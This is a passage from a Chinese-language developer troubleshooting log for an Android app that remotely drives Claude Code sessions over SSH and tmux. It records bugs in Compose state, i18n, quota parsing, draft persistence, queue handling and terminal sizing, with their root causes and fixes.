   `/opt/workspace/文件传`。只认 ASCII 的话路径会在中文那一段被切断，
   点开的是**上一级目录** —— 看起来像「跳错地方」而不是「没认出来」，更难查。
   ⚠️ 但**不能顺手把 U+3000–U+303F 一起收进来**，那是「。，、《》」这些标点：
   中文句子不写空格，`/a/b。后面这句话` 会被整条吃成假链接。
   只收 **U+4E00–U+9FFF**。

3. **行内代码要连反引号一起包进链接文字。** 写成 ``[`/a/b`](…)`` 才行 ——
   只把反引号**里面**换成 `[]()` 的话，代码段里的 markdown 不会被解析，
   屏幕上原样冒出一串 `[/a/b](yxi-file:///a/b)`。
   顺带：目录常写成 `` `/a/b/` ``，正则末尾那个可选的 `/` 不能省，
   否则行内代码那一支用的 `matches` 整段对不上，这种一律不认。

**判据**：这类「从自由文本里认东西」的功能，**认错比漏认严重**。
漏认只是点不动；认错是把正文变成假链接、点了还跳走。
测试要一半用来防误伤，而且样本要从**真实对话**里抠（上面 1 和 2 都是真句子）。

## 99. 工作区已经开着的时候，点通知跳会话纹丝不动

**症状**：查 #98 时顺手发现的。工作区停在 A 会话，点 B 会话的通知 —— 界面不动。

**根因**：`Workspace` 里的 `sessionName` / `mode` 都是 `remember(host.id)`。
同一台主机上换会话，**key 没变**，那两个状态原样留着。
只有从标签页进去（`work` 从 null 变过来、composable 是新建的）才碰巧是对的 ——
所以平时测不出来，非得在工作区里点通知才撞得上。

**修法**：`MainActivity` 里按目标 key 一下：
`key(w.host.id, w.session, w.mode) { Workspace(...) }`。

**怎么避开**：`remember(k)` 的 key **必须包含所有会让这块状态失效的输入**。
只写 `host.id` 是因为写的时候脑子里只有「换主机」这一种变化，
漏了「同一台主机换会话」。参数变了而状态不跟着变 = 界面卡在旧值，不报错。

## 100. ⭐ 中英切换：一次性求值把半个界面的语言冻住了

**先说为什么没用 `strings.xml`**（认真比过，这个项目里它更差）：
1. 一多半的串**带插值**。资源那套要 `%1$s` + `getString(id, a, b)`，
   参数顺序错了不报错、只是显示错，而中英参数顺序常常不一样。
2. 要翻的字**一堆在非 composable 里**（SSH 报错、通知文案、卡片标题）。
   资源要 `Context`，就得把它一路传进纯逻辑类 —— 为了翻译污染分层。
3. 起 id 是纯开销。中文原文本身就是天然、唯一、一眼认得出的 key。

所以做法是 `t("中文原文")`，查不到就**原样返回中文**。
代价写在 `I18n.kt` 里：没有编译期检查 → `dev/i18n-check.sh` 扫源码补上。

**真正踩的坑：**

```kotlin
private enum class Tab(val label: String, …) {
    Sessions(t("会话"), "◫"), …          // ← 类初始化时求值**一次**
}
```

现象很具体：切成英文之后，**同一屏上别的字都变了，只有底部导航栏还是中文**。
因为 enum 常量的构造参数在类初始化时就算完了，之后 `I18n.lang` 再变也与它无关，
而且它不是 Compose 的状态读取，压根不会触发重组。

同一个毛病还有两处：`object Slash { val ALL = listOf(...) }`、
`Transcript.INJECTED` —— **object 的 `val` 初始化器也是一次性的**。

**修法**：全部改成 `get()`。`enum class Tab(private val zh: String)` +
`val label: String get() = t(zh)`。每次读都重新查表，也才能被 Compose 当状态读。

**副作用（被自己的测试抓住了）**：`val ALL = listOf(...)` 改成 `get()` 之后，
**每次读都是新对象**。`SlashTest.没有命令名是另一个的前缀` 里写的是
`if (a !== b)`，改完之后连「同一条命令跟自己比」都拦不住，一测就红。
→ 改成比 `name`。**把 `val` 改成 `get()` 会改变对象标识语义**，
凡是用 `===`/`!==` 的地方都要回头看一眼。

**怎么避开**：判据是「这句话是在**什么时候**算出来的」。
类初始化、object 初始化、顶层 `val` —— 全是一次性的，翻译放进去就冻住。
翻译只能出现在**每次读都会重新执行**的位置（函数体、`get()`、composable）。

## 101. 灵动胶囊：系统「不给」是静默的，所以让 App 自己去问系统要答案

**问题**：荣耀的灵动胶囊（别家叫灵动岛 / 实况窗 / 焦点通知）能不能联动？

**先查清楚有没有标准入口**（不猜，拆 SDK 看）：

```
$ javap -constants android.app.Notification | grep -i promot
  public static final String EXTRA_REQUEST_PROMOTED_ONGOING = "android.requestPromotedOngoing";
  public static final int    FLAG_PROMOTED_ONGOING = 262144;
  public boolean hasPromotableCharacteristics();
  public boolean isRequestPromotedOngoing();
$ javap 'android.app.Notification$Builder' | grep -i promot
  public Notification$Builder setRequestPromotedOngoing(boolean);
```

有。Android 16 起 AOSP 给「实时活动」定了标准通路，各家 ROM 的胶囊都在往这上面靠。

**真正的坑是：这是「请求」不是「命令」。** 系统觉得不够格就**当没看见** ——
不报错、不抛异常、什么都不发生。于是「做了没生效」和「压根没做」现象一模一样，
而我手上没有荣耀手机，模拟器又是 Android 14（连这个判定都没有）。

**做法：不猜，让 App 去问系统要答案。** 发完之后回头从
`NotificationManager.getActiveNotifications()` 把那条捞出来，看系统有没有真的盖上
`FLAG_PROMOTED_ONGOING`（0x40000），再反射调一次 `hasPromotableCharacteristics()`，
把结果打进开发者模式的诊断报告里：

```
胶囊   ✗ 系统没有提升 · 够格? 这个系统没有这个判定（Android 16 以下） · Android 14
```

用户在自己手机上跑一次，这一行就把问题回答了。

**两个实现细节**：
- `EXTRA_REQUEST_PROMOTED_ONGOING` / `FLAG_PROMOTED_ONGOING` 都是**编译期常量**
  （`javap -constants` 确认过），会被内联，所以老系统上不会因为找不到符号而崩。
  而 `hasPromotableCharacteristics()` 是**方法**，直接调在老系统上会 `NoSuchMethodError`
  —— 用反射，「有就调、没有就说没有」。
  ⚠️ 别用版本号判断：国产 ROM 改版本号的多得是，反射问「你有没有这个方法」才是真的。
- 常驻通知从此**跟着状态变**（没人等你 = 安静一行；有人等 = 变铜色 + 列出会话名），
  更新用**同一个 id `notify()`** 就行，别重新 `startForeground()` ——
  后者在新版安卓上有一堆前台服务类型的限制。

**怎么避开**：凡是「向系统请求某种特殊待遇」的 API（快捷方式置顶、画中画、
免打扰豁免、实时活动），**成功与否都要能在设备上读回来**。
读不回来的功能等于没做 —— 你永远只能说「应该行吧」。

## 102. `/usage` 的数在哪、要不要动用户的会话去拿

**用户的问题**：对话里打 `/usage` 什么都不显示（对，因为**它只画在 TUI 上，转录里一个字都没有**）。
「那你直接跑一次 `/usage` 把额度显示出来不就行了？」

**先分清这是两个数，别混**：
| | 来源 | 能回答什么 |
|---|---|---|
| `ccusage`（读本地日志） | 那台机器的 `~/.claude/projects` | 今天烧了多少 token、多少美元 |
| `/usage`（Claude Code 自己） | Anthropic 服务端的订阅配额 | 5 小时窗口用了几成、这周用了几成、几点重置 |

**订阅额度只有 Claude Code 拿得到** —— 本地日志算不出「你的订阅用掉了百分之几」。

**「跑一次」这条路到底干不干净？实测三条**（临时起一个会话，跑 `/usage`，看代价）：
- `Total cost: $0.0000` —— 它是**本地命令，不调模型**，跑一次不花钱
- `~/.claude/projects` 下**压根没建目录** —— 不写转录、不占一轮对话
- 面板是浮层，`Esc` 一按就没

所以可以。但有两个**必须守住的前提**：
1. **输入框必须是空的。** 里面有半截草稿的话，`/usage` 会接在后面，
   回车就把「用户没写完的话 + /usage」整条发出去了 —— 这是唯一会造成真实损失的一步。
2. **跑完一定要 Esc。** 面板不关的话，看板每 5 秒一次的抓屏看到的是面板，
   会话状态会被判错（表现成那台机器无缘无故变「空闲」）。

**解析上的坑**：面板里 `% used` 出现**多次** —— `Current session`、
`Current week (all models)`、`Current week (Fable)`，底部说明文字里还有
`94% of your usage was at >150k context`。
按顺序数第几个的话，账号一开新模型就整片错位。
**锚点必须是标题文字，而且只往下找 4 行。** [QuotaTest] 用真面板盯着这三种误读。

## 103. 「上下文用了多少」不用问服务器 —— 转录里就有

**需求**：每个会话显示上下文占用。`/context` 也只在 TUI 上，同样刮不到。

**其实不用刮**。最后一条 assistant 消息的 `usage` 就是答案：

```
input_tokens + cache_creation_input_tokens + cache_read_input_tokens
```

实测同一会话连着四轮：654665 → 655610 → 655751 → 656203，跟着涨，正是要的。
这些行**本来就在手上**（对话模式一直在流式解析转录），顺路取一个字段，
**零额外往返**。

⚠️ **只看 `input_tokens` 会得到 1。** 真的就是 1 —— 一个 65 万 token 的会话，
因为绝大部分是缓存命中，落在 `cache_read_input_tokens` 里。三项必须相加。

⚠️ **不给百分比。** 算百分比要知道窗口大小，转录里没有：
实测 `claude-opus-4-6` 的会话上下文已经 656K，远超常说的 200K ——
同一个模型名下有不同窗口。按 200K 算会显示 328%，比不显示危险得多。

**踩到的第三个坑**：`Incremental.add` 里那个 `onCtx` 回调**有默认值 `{}`**，
接线时漏掉最后那个 lambda，**编译照样通过**，只是 `ctx` 永远是 null ——
界面上表现为「上下文那一格永远不出现」，不报错、不崩。
带默认值的回调参数是这种「静默失效」的常见来源。

**顺带修掉一个一直没生效的功能**：`ccusage` 的探测只找
`~/.local/bin` / `~/.npm-global/bin` / `/usr/local/bin`，而本机的 node 装在
`/opt/node-v22.15.0-linux-x64/bin` —— `command -v ccusage` 找不到，
于是用量整块**默默藏起来**。「探不到就藏起来」是对的，但**探得不够狠**就变成功能形同虚设。
现在多扫 `/opt/node*/bin` 和 `/usr/lib/node_modules/.bin`。

## 104. 打了一半的字，切个模式就没了

**症状**：用户原话「我在对话里输入的字，切到终端或者切到别的地方再回来就立马消失」。

**根因**：又是 #96 那一条 —— **状态存在了比它自己命短的地方**。
`var draft by remember { mutableStateOf("") }` 在 `ChatScreen` 里，
而切模式会销毁 `ChatScreen`。

**修法没有选「往上提一层」**。提到 `Workspace` 能治「切模式」，
但治不了「退回会话列表再进来」，更治不了「App 被系统杀掉」。
**草稿是用户亲手打的字，丢了就是丢了** —— 这种东西的存放位置应该由
**最坏情况**决定，不是由「这次报的那个场景」决定。所以直接落盘
（`Drafts`，按 `主机+会话` 分键），三种情况一起解决。

**两处都要写，少一处都会在某种走法下丢字**：
- 打字时防抖 600ms 存一次 —— 管「App 被杀」
- `onDispose` 立刻存一次 —— 管「切模式 / 退出去」，那一下防抖还没到点

还有第三处：**发出去之后要立刻清盘上那份**。只清内存的话，
防抖那 600ms 里退出去，下次进来发过的话又冒出来一遍。

## 105. API 报错在转录里是一条正常的 assistant 消息

**症状**：用户原话「`API Error: 529 Overloaded…` 这些报错不要用正文来渲染」。

**根因**：它在转录里 `type` 就是 `assistant`，内容就是一段 text ——
不加处理就走进 markdown 正文，屏幕上看起来像 Claude **一本正经地跟你解释**
「服务器过载，稍后再试」。而实际上那一轮**根本没轮到它说话**。

**判据用转录自己的标志，不要匹配文本**：顶层有 `"isApiErrorMessage": true`。
匹配 `"API Error"` 会误伤真正在讨论这个错误的对话 ——
用户问「API Error 529 是什么意思」，回答里也有这几个字，
那条会被渲染成红色故障卡片。[ApiErrorTest.认标志不认文本] 就是盯这个的。

**顺带补了 #99 的一个漏**：`key(w.host.id, w.session, w.mode)` 少了 `cwd`。
同一个会话名换个 cwd 跳过去，key 没变 → 界面不动。
（实际用起来会话名基本决定 cwd，所以平时撞不上；是构造测试样例时露出来的。）
**`key(...)` 要覆盖「所有会改变这块界面该显示什么」的输入**，漏一个就是静默失效。

## 106. 「5 小时窗口」那条进度条不是额度，是**时间**

**用户的问题**：「现在显示额度为什么只有五小时额度，不是还有一个额度为什么没显示」。

**两个毛病，一个是缺功能，一个是标签在骗人**：

1. **周额度确实没有** —— 它只在 `/usage` 里（账号级订阅配额），
   而卡片上那些数来自 ccusage（读本地日志）。**本地日志算不出「订阅用掉了几成」**。
2. 更糟的是，卡片上那条进度条标着「5 小时窗口」，画的却是 `elapsedPercent` ——
   **这个 5 小时窗口过去了多少时间**，跟烧了多少额度**毫无关系**。
   用户理所当然把它读成了额度。**标签写「5 小时窗口」而条画的是时间，
   就是在邀请人误读。** 改成「窗口已过」。

**修法**：点一下卡片 → 借一个会话跑 `/usage` → 真额度两行摆在最上面。

**实测确认安全闸真的在拦**（这是最要紧的一条）：
点完之后回头看所有会话 ——
- `cc-root` 输入框里是 `zz`、`cc-项目` 里是 `/ponytail-help`：**两条都没被碰**
- 干净的那几个：`❯ ` 空的，Esc 之后画面复原
- 所有转录里 `"content":"/usage"` **一条都没有**

也就是说：**两个会话里有用户没发完的字，闸把它们挡住了**——
而这正是不加闸时会造成真实损失的那个场景。
**「危险操作 + 前置检查」这种组合，验收标准不是「功能能用」，
是「在该拒绝的时候真的拒绝了」。** 得专门造出该拒绝的情况来看。

## 107. 差点又发出一个「清单是新的、包是旧的」

**怎么发生的**：一条命令里前半段 `cd android` 跑测试，后半段忘了目录已经变了 ——
`cat >> TROUBLESHOOTING.md` 建出一个野的 `android/TROUBLESHOOTING.md`，
`handover.md` 找不到，**`cd android` 失败于是没重新构建**，
但 `install.sh --publish … 32 0.7.4` 照发不误。

结果：清单写着 32，包还是上一版编的那个。**正是 #69 那个坑的翻版** ——
三处「看起来都成功了」，用户手机上下到的是旧包。

**是怎么发现的**：发完顺手核了一句「包里的 versionCode 跟清单一致吗」，
重新构建之后 sha256 变了（`8e116b9d` → `c2c5b333`）—— 说明前一次发的确实是陈货。

**修法/怎么避开**：
- **`--publish` 之前必须先构建，而且要确认构建真的跑了。**
  这次是 `cd` 失败被 `;` 吞掉，退出码没人看。
- **发完要复核包里的版本号**，别只看 install.sh 打印的那行 ——
  那行打的是**你传给它的参数**，不是包里的事实：
  `aapt2 dump badging ~/.yxi/Yxi.apk` 或装上去 `dumpsys package app.yxi`。
- 老毛病：**跑多步命令时不要中途 `cd`**，要么全用绝对路径，要么每段自己 `cd`。
  这个坑在本文件里已经有过一次（野 `android/TROUBLESHOOTING.md`），又踩了。

## 108. ⭐ `/model` 送数字 = 改**账号默认**，不是只换这个会话

**需求**：手机上换模型，别让人去 TUI 里翻选单。

**`/model` 打开的是个带编号的选单**，形状跟权限提示一模一样。
所以第一反应是复用现成的「点数字」那套。**实测发现后果差很远：**

| 怎么提交 | 结果 |
|---|---|
| 直接送数字 `3` | `Set model to Fable 5 **and saved as your default for new sessions**` |
| 方向键挪到目标再送 `s` | `Set model to Fable 5 **for this session only**` |

**送数字改的是账号级默认**，以后新开的每个会话都跟着变，而且 `~/.claude/settings.json`
里的 `model` 会被改写。在手机上顺手一点就干这件事，是那种事后完全想不起来为什么的坑。
（我自己测的时候就把默认从 `opus[1m]` 改成了 Fable，回头才发现要复原。）

**所以界面上：点一下 = 只换这个会话**（可逆、影响面小），
「同时设为默认」是个要单独勾的复选框，旁边写明白「以后新开的会话都用它」。

**必须让通用解析器让路**：`Prompt.parse` 也会把这个选单认成「等你选」，
于是界面上同时冒出两个入口 —— 而那条路点一下正是**送数字**。
在 `Prompt.parse` 开头加一句 `if (Model.parse(screen) != null) return null`。

**窄窗口下的两个坑**（手机上的终端本来就窄矮，这是常态不是例外）：
1. **描述会折行**，续行不能被当成新选项。
2. **列表被高度截断**，底下写着 `… +2 models`，而且滚动位置的那几行
   **行首是 `↓` / `↑` 不是 `❯`** —— 正则只放 `❯` 的话，带 `↓` 的那一项
   **整条被漏掉**，界面上少一个模型且不报错。
   修法：截断了就按方向键滚出来边滚边收，**最后必须滚回原位**，
   否则 `pick` 按相对步数算光标就全错了。

**还有一条**：面板不是一瞬间画完的。一次抓屏（1.8s）拿到半个 ——
表现是「点了没反应，过一会儿会话里自己冒出个选单」。改成重试着抓。

## 109. ⭐ 换皮：两百多处直接写死的颜色，怎么不改它们也能换

**需求**：设置里能换界面风格，先来一套尽量像 参考款的浅色。

**难点不在配色，在于颜色是怎么被引用的**：全 app 有 **250+ 处**直接写着
`Copper` / `Dim` / `SurfaceContainerLow` —— 它们是 `Color.kt` 里的**顶层常量**。
按常规做法要把每一处改成 `MaterialTheme.colorScheme.*`，那是一次 250 处的机械改动，
风险跟收益完全不成比例。

**做法：把常量变成取值器，名字一个不改。**

```kotlin
// 原来
val Copper = Color(0xFFFFB787)
// 现在
val Copper: Color @Composable @ReadOnlyComposable get() = LocalPalette.current.Copper
```

调用点**一个字都不用动**，还自动跟着切换重组。
（跟 i18n 那次「中文原文当 key」是同一个思路：**让改动落在一个地方**。）

**代价是编译器会替你找出所有非 composable 的用法** —— 一共 5 处，全在 `ui/` 里：
`Highlight.of` / `JsonTree.valueColor` / `ToolCards.accent` / `Switcher.dotColor`
标上 `@Composable` 就行；`DPad` 那处是 `Canvas {}` 的 lambda（DrawScope 不是 composable），
颜色得先在外面取好。**这些是编译期报错，不会漏。**

**浅色主题真正容易翻车的地方是次要文字**：
照抄 Google 在**白底**上的取值（`Dim = #80868B`）放到卡片底 `#F0F4F9` 上，
对比度只有 2.9:1 —— 提示文字直接糊了。得整体压深一档。

**还有一个只有截图才看得出来的**：`CopperContainer` 同时当「你的消息气泡」和
「选中的胶囊」。在浅色里取成跟卡片一样的 `#F0F4F9`，**选中态就消失了** ——
两个胶囊长得一模一样，看不出选了哪个。改成 参考款的浅蓝 `#D3E3FD` 一举两得。

**刻意没做的**：终端不跟着变浅。ANSI 彩色输出按深底配的，
浅底上黄色/亮绿几乎看不见，而那恰恰是警告和 diff 用的颜色。
代价是浅色下切到终端会亮暗跳一下 —— 设置页里写明白了。

## 110. 命令输出里带着 ANSI 转义，纯文本卡片直接把它画出来

**症状**：浅色主题下一眼看到卡片上写着 `Set model to ESC[1mFable 5ESC[22m for this session only`
（`ESC` 处是真的转义字符）。

**根因**：`/model` 之类的回显是**终端输出**，原样带着加粗开关序列。
终端会解释它们，而对话里的注入卡片是**纯文本渲染**，于是直接画出来。
深色主题下也一样有，只是我一直没注意到 —— **换皮意外地当了一次 code review**。

**修法**：展示前洗一遍（`Transcript.clean`）。

⚠️ **ESC 有时会被吃掉只剩方括号那一段**（转录里两种都见过），所以正则里 ESC 是可选的。
⚠️ 代价是理论上会误伤正文里真写着那种形状的情况。防误伤的用例是
`正常的一句话 [1] 引用` —— `]` 不是字母，所以不匹配，正文里的引用编号安全。
⚠️ **只在展示前洗，别动用于比对的原文** —— 排队去重靠的是原文相等。

## 111. ⭐⭐ 排队气泡永远不消失（第三次）—— `dequeue` 不带 content

**症状**：用户截图里挂着一条 `/modle`（打错的 `/model`）「排队中」，很久都不走。

**这已经是同一个坑的第三次了**：#76 是「只认 `remove`」，#111 是「`dequeue` 根本没处理」。

**把真数据统计一遍，答案就在里面**：

```
操作      总数    带 content
enqueue   1394      491
dequeue   1094        0      ← 一条都没有
remove     294      294
popAll       5        5

enqueue 1394  vs  dequeue+remove+popAll 1393   ← 差 1，就是此刻还排着的那条
```

也就是说：**每一条 enqueue 都有且只有一个出口**，而最大的那个出口 `dequeue`
**从不告诉你走的是哪一条**。这正是当初退而求其次用「这句话出现过没有」的原因。

**但那个兜底救不了斜杠命令**：`/modle` 的完整踪迹是

```
enqueue  content='/modle'
dequeue  (无 content)
user     '[Request interrupted by user]'
system   'Unknown command: /modle. Did you mean /model?'
```

它被本地消化掉，**永远不会作为 user 消息出现** → `said` 永远命中不了 → 气泡永久挂着。

**修法：把队列当队列做。**
- `enqueue` 进队尾（**空 content 也要占位** —— 老格式的 enqueue 没有 content，
  不占位的话后面弹队头会弹错人；展示时再滤掉空的）
- `dequeue` 弹**队头**（先进先出，这本来就是队列的语义）
- `remove` / `popAll` 带 content，按内容精确删

顺带把容器从 `LinkedHashSet` 换成 `ArrayList`：Set 会把
**同一句话排两次合成一条** —— 那是实打实地丢消息。

**怎么避开**：**别用启发式代替协议。** 当初「出现过就算说过」是因为
`dequeue` 没有 content，看起来没法配对；但只要把全量事件统计一遍就会发现
**进出是严格守恒的**，顺序本身就是缺失的那个信息。
遇到「这个事件缺字段」的时候，先数一数总量对不对得上，再决定要不要放弃精确匹配。

## 112. 主机页上的额度：查到了却没存，等于没查

**症状**：用户原话「主机里面的服务器还是没有标清楚五小时和周限额度用了多少还剩多少」。

**两个毛病**：
1. 额度是「点一下才去查」的（要借会话跑 `/usage`），**查完只放在内存里**。
   主机页是另一个页面、另一份状态 —— 它**永远看不到**那个结果。
   → 加 `QuotaCache` 落盘，跟 `UsageCache` 并排。
2. 只显示「已用 10%」。**这个数是用来决定「今天还能不能开大活」的，
   只给一个百分比等于让人自己做减法。** → 「已用 10% · 剩 90%」两个都写。

主机行现在是两档都画：5 小时 / 本周，各带进度条、已用、剩余、重置时间，
底下再写一句「几分钟前查的」——**过期的数字必须标明它有多旧**，
否则它比没有更危险。

## 113. ⭐ 对话状态条又没了 —— 窄屏脚注被截断，`esc to interrupt` 没露出来

**症状**：终端里明明写着 `Cogitating…`，对话模式底部的状态条整个消失。

**根因**：判断「在忙」看的是脚注里有没有 `esc to interrupt`。而手机上的终端很窄，
脚注被砍成 `⏵⏵ bypass permissions on (shift+tab to cycle) · e…` —— 那几个字**根本没渲染出来**。
于是宽屏（我这台 158 列）测一切正常，窄屏（用户手机 ~46 列）永远判成不忙。

**修法**：**判据换成屏幕上最后一条状态行本身的形态**：
`Gusting…` 结尾是 `…` = 还在跑；`Baked for 13s` 中间是 ` for ` = 跑完了。
脚注仍然认（宽屏时是额外确证），但不再是唯一依据。

**怎么避开**：**别把判据建立在一段可能被截断的文本上。** 脚注是最右边、最容易被砍的地方。
状态行顶格在左边，砍不到 —— 用它。测试要专门造**窄屏截断**的样本
（`LiveTest.脚注被截断时也要认出在忙`）。

## 114. ⭐⭐ 终端花屏：桌面还开着同一个会话，把窗口撑宽了

**症状**：终端画面整个是花的 —— 内容折行错位，一条条绿色的 `[cc-mail] 0:claude*` 堆起来。

**根因**：用户在桌面（或别处）也 `tmux attach` 着同一个会话，那个客户端是 159 列宽。
tmux 把窗口尺寸撑到宽客户端的大小，手机这边 46 列**塞不下 159 列的内容**，
于是整屏 reflow 错位；而那条 159 列宽的**状态栏**在 46 列屏幕上折成好几行，
一屏里堆出好几条 —— 就是那些绿条。

**修法两步**：
1. `tmux attach **-d**`：`-d` 把别的客户端踢下来，手机成为**唯一**客户端，
   窗口立刻缩到手机尺寸（实测 159→55 列）。这正合 Yxi 的定位 —— 手机是遥控器，
   抓过来就该由它说了算。
2. `tmux set -t <会话> status off`：关掉那条状态栏。手机上它白占一行，
   而会话名我们自己的顶栏已经显示了。用 `-t 会话` 而不是 `-g`，只关 Yxi 开的这几个。

**踩到的子坑**：`tmux set -t X status off \; tmux set -g ...` ——
用 tmux 的 `\;` 串接的话，第二个 `tmux` 会变成 `set-option` 的**参数**，整条失效，
状态栏关不掉。要用 **shell 的 `; `** 起一个独立的 tmux 调用。

**怎么避开**：多客户端 attach 同一 tmux 会话时，尺寸冲突是常态。
一个「主控」客户端（这里是手机）应当用 `-d` 拿到独占，而不是跟别人抢尺寸。

## 115. 附件上传要点好几次才成 —— 共享 SFTP 通道坏了，而且失败是静默的

**症状**：用户原话「附件上传要好几次才能成功」。

**两个叠加的问题**：
1. **上传复用那条共享 SFTP 通道**。通道空闲久了会被服务器关掉，
   或上一次操作出错后进了坏状态，之后每次 `put` 都失败。
2. **失败是静默的**：`runCatching { ... }` 后面**没有 `onFailure`**，
   传砸了既不报错也不留痕，用户只看到「没反应」——于是一点再点，
   偶尔赶上通道恢复就成了，就成了「要好几次」。

**修法**：
- **每次开一条新 SFTP 通道**，用完就关。新通道保证是好的；开一条就一个来回，
  比起传一整张图可以忽略。（不复用 = 不会撞上坏通道。）
- **试两次**：新通道也可能撞网络抖动，重开再来一次。
- **两次都不行就 Toast 报真原因**，不再让人瞎点。
- 读文件失败（授权过期）和传失败**分开报** —— 一个是手机侧，一个是网络侧。

**怎么避开**：**长期复用的通道要么保活要么每次重开，别假设它一直好。**
而任何会失败的用户操作，失败路径**必须有反馈** —— 静默失败逼着用户用「多试几次」
当调试手段，那是最差的体验。

## 116. 设置页照参考款 改版：加引导图标，Card 只改一处

**需求**：设置 UI 学 参考款（截图：每节左边一个线性图标 + 粗标题 + 灰副标题，留白大）。

**做法**：设置页所有分节都走同一个 `Card(title) { content }`。
给它加一个可选 `icon` 参数、把标题字号提上去、留白放松 ——
**改这一个 helper，七个分节一起变**，各自的内容（额度探测、诊断、密钥管理）一个字没动。
跟换皮那次「改一处，两百处跟着变」是同一个思路：**让改动落在收口的地方。**
图标用 `Glyph` 里新加的几个线性小图（信息/钥匙/地球/调色板/扳手）。

## 117. ⭐⭐ 额度查询别再借会话了 —— `claude -p "/usage"` 直接拿

**背景**：主机页要显示 5h / 7d 额度。原做法是借一个空闲会话跑 `/usage` 刮屏。

**撞墙**：用户机器上会话**全忙 / 输入框都有草稿**，`borrowable` 一个都借不到，
额度永远查不了。界面老实报「没有空闲会话可借」——诚实，但功能等于废了。

**更好的路（实测挖出来的）**：`claude -p "/usage"` ——非交互打印模式，直接把额度打出来：
```
Current session: 12% used · resets Aug 24, 3:10pm (UTC)
Current week (all models): 11% used · resets Aug 30, 12:59pm (UTC)
```
三个好处，一个个验过：
- **不用借会话** —— 会话忙不忙、有没有草稿，都不影响。
- **不打扰任何东西** —— 不往任何 tmux 会话发键。用户的活会话一个没碰
  （查完 `grep '"content":"/usage"'` 用户的会话转录里一条都没有）。
- **不花钱** —— `/usage` 是本地命令，`-p` 打印完就退，不调模型（$0.0000）。

**几个实现要点**：
- 真 claude 在 `~/.local/bin/claude`。非交互 SSH 的 PATH 是残的，要显式补
  `~/.local/bin` + `/opt/node*/bin`（claude 是 node 脚本）。
- **别加 `IS_SANDBOX`**：那是给交互式 `--dangerously-skip-permissions`（root 限制）用的，
  `-p` 模式不需要，加了反而可能改行为。
- `timeout 30`：连服务端拿额度够了，再久是卡住，别让界面上的「查着…」转到天荒地老。
- 解析锚点是「Current session」「Current week (all models)」两行文字 ——
  输出里 `Current week (Fable)` 也带 `% used`，按「第几个 %」数会错位。

**`borrowable` 留给了 `/model`**：它是**真需要在活会话里送键**的（选单要方向键操作），
搬进 `Model`。额度不再需要它。

**怎么避开**：「去某个交互式 TUI 里刮屏」永远是最后手段。
先找有没有**非交互接口**（`-p`、`--json`、一个命令行子命令）——
干净、不抢占、可重复，还不用处理「借不到」这一堆边界。

## 118. 设置页改成「一条条排列，点开才展开」

**需求**：用户要设置默认收起成一行行，点对应的才展开。

**做法**：`Card` helper 加 `startExpanded`（默认 false）+ `subtitle`（收起时那行灰字）。
标题行整行可点 toggle，右边一个会翻的箭头 `▾`/`▴`，展开区 `AnimatedVisibility` 淡入。
收起时每节一行：图标 + 标题 + 一句副标题（版本号 / 当前语言 / 盯着几台…），
一屏能看全，想改哪项点哪项。**又是改 Card 一处，七节全变。**

⚠️ `rememberSaveable(title)` 存展开状态 —— 转屏 / 切走再回来别把展开的又收起。

## 119. ⭐ 历史模式滑动「像有档位」—— PageUp 一下 8 行，换成鼠标滚轮一下 1 行

**症状**：用户原话「开了终端的历史模式，滑动时像有档位一样，不那么平滑」。

**根因**：历史模式把上下滑动翻译成 **PageUp/PageDown**。实测在一个 24 行的终端里，
一个 PageUp 顶行从 44 跳到 36 ——**一下 8 行**。手机竖屏一页更多，
划一下就蹦过一整屏。这个「整页跳」就是「档位」感。

**挖出更好的**（实测对比 granularity）：Claude Code 的 TUI **也认鼠标滚轮**
（它为点选项本来就开了鼠标追踪）。滚轮一下**只滚 1 行**（顶行 44→43→42）。
把它映射到手指位移，就是平滑滚动。

**修法**：`HistoryScrim` 送 **SGR 1006 滚轮事件**而不是 PageUp：
- 上滚 `ESC[<64;1;1M`，下滚 `ESC[<65;1;1M`（坐标 1,1 永远合法）。
- 阈值从「110px 一页」改成「18dp 一行」，一次快划送十来个滚轮事件，能跟上。

**几个要点**：
- 能用的前提是那个全屏程序开着鼠标追踪。Claude Code 开了，所以滚轮字节被它接住。
  实测真会话上滑动，顶行按行平滑变化、双向都对。
- 太小的 px/行（真跟像素走）会送出几十个事件、每个一个 SSH 来回反而卡；
  18dp 是手感和事件数的平衡点。

**怎么避开**：「一下跳一大格」的交互，先看目标程序认不认更细的粒度
（滚轮 vs 翻页键、行 vs 页）。同一个「往回看」的需求，粒度选错就从平滑变成顿挫。

## 120. 会话页顶上的额度卡撤了，只留主机页长按

**需求**：用户「会话页顶上不显示额度，主机长按显示额度的功能保留就行」。

删了 `UsageCard`（会话页顶卡）+ `UsageStrip`（主机页旧的缓存细线）+ `UsageCache`
+ 会话页那条 `Usage.probe` 慢轮询。连带 `Usage.probe`/`Usage` 数据类也没人用了
（只剩 `Usage.today` 给对话右上角的「今日 X · $Y」）。
`QuotaCache` 留着 —— 主机页长按（`HostQuota`）还用它做「先画缓存再刷新」。

**顺带**：`UsageBar.kt` 里六个顶层符号删到只剩 `QuotaCache` 一个。
文件名有点名不副实了（bar 没了），但改名是额外的 churn，注释里说清就行。

## 121. ⭐ 会话卡改版：按钮撤了，长按从「回一句」改成「拖排序」

**需求**：用户要删掉卡片上的 `开终端`/`回它一句` 按钮 + 长按回复，改成**长按拖动排序**，
并问「怎么跟回它一句做区分」。

**区分的答案**：**轻点 = 进对话（在里面回它），长按 = 拎起来拖排序**。
`detectDragGesturesAfterLongPress` 只在长按之后接管手势，轻点漏给底下的 `clickable`，
两者天然不打架。回复能力没丢 —— 点开对话就能回，只是不再有独立按钮/长按快捷。

**Pinned 从 `Set` 改成有序 `List`**：排序的**次序本身就是数据**，Set 存不住。
成员判断（`name in pinned`）在 List 上照样能用。落盘用换行分隔的字符串
（`SharedPreferences` 的 `StringSet` **恰恰不保证顺序**，正是要避开的）。

**拖动实现的坑（先红后绿抓到的）**：`pointerInput` 的手势协程**活得比一次重组久**。
每换一次位，父层重组、`tops` 变成新列表，但协程闭包捕获的是**旧的** tops/回调 ——
于是拖再远也只动一格。用 `rememberUpdatedState(tops)` 让闭包每次读到最新的，
`while`（而不是 `if`）允许一次回调跨多格，多格连拖才对。
实测：单格拖可靠、拖满两格能把顶上那张送到底、重装后次序还在。

**只让置顶组可拖**：非置顶是按状态/活跃度自动排的，拖它没意义。
置顶组从 `LazyColumn` 的散 item 收成**一个 item 里的普通 Column**，
拖动只在这几张卡之间发生 —— 跨 lazy item 拖要自己算屏幕位置 + 边缘自动滚动，太脆。

